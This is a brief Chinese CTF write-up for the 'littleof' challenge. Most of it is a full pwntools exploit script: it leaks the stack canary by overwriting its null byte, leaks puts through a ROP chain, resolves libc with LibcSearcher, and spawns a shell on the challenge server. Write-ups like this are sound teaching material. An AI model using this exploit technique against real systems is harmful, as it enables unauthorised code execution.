# canary+ret2libc

例题：[[2021 鹤城杯\]littleof | NSSCTF](https://www.nssctf.cn/problem/468)

1. 利用 **覆盖截断字符** 来泄漏 **canary** ，再ret2libc获得shell：

   ![image-20240702115712821](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021157889.png)

2. EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   # p = process("./littleof")
   p = remote("node4.anna.nssctf.cn",28515)   
   elf = ELF("./littleof")
   
   #覆盖截断字符，获取canary
   p.recvuntil(b'Do you know how to do buffer overflow?\n')
   #发送var_c-buf+1个 b'a'，最后一个a可以覆盖掉canary的最低字节 b`\x00`
   payload = b'a'*(0x50-0x8+1)
   p.send(payload)
   #接受返回后从行拼接canary
   canary = p.recv()[0x49:0x49+7]
   canary = canary.rjust(8,b'\x00')    #从新组成canary
   print(hex(u64(canary)))
   
   
   #ret2libc
   #获取got、plt地址
   got = elf.got['puts']
   plt = elf.plt['puts']
   print(hex(got),hex(plt))
   
   #获取传参地址
   pop_rdi_ret = 0x0000000000400863
   main_addr = 0x00000000004006E2
   ret = 0x000000000040059e
   
   #构造payload，获得puts函数的地址
   payload = b'a'*(0x50-8)+canary+b'a'*8+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   p.sendline(payload)
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   libc = LibcSearcher('puts',addr)
   libc_base = addr - libc.dump('puts')
   sys_addr = libc_base + libc.dump('system')
   str_bin = libc_base + libc.dump('str_bin_sh')
   print(hex(libc_base),hex(sys_addr),hex(str_bin))
   
   #重新回到sub_4006E2函数，这次不需要泄漏canary,随便输入即可
   p.recvuntil(b'overflow?\n')
   p.send("aaaaaaaaaa")
   
   payload = b'a'*(0x50-8)+canary+b'a'*8+p64(ret)+p64(pop_rdi_ret)+p64(str_bin)+p64(sys_addr)
   p.sendline(payload)
   p.sendline(b'cat flag')
   # 与远程交互
   p.interactive()
   ```

   

   ![image-20240702120127085](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021409062.png)![image-20240702120105214](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407021201298.png)
   
   